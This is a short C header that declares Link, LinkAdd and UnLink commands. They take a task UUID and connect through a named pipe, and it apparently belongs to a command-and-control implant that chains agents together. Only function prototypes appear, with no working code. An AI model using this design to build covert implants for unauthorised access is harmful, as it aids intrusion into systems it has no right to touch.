#pragma once
#ifndef LINK_H
#define LINK_H

#include <windows.h>
#include "Parser.h"
#include "Config.h"

#ifdef INCLUDE_CMD_LINK
VOID Link(PCHAR taskUuid, PPARSER arguments);
BOOL LinkAdd(_In_ char* NamedPipe, _Out_ PVOID* OutBuffer, _Out_ SIZE_T* OutLen);
#endif

#ifdef INCLUDE_CMD_UNLINK
VOID UnLink(PCHAR taskUuid, PPARSER arguments);
#endif

#endif //LINK_H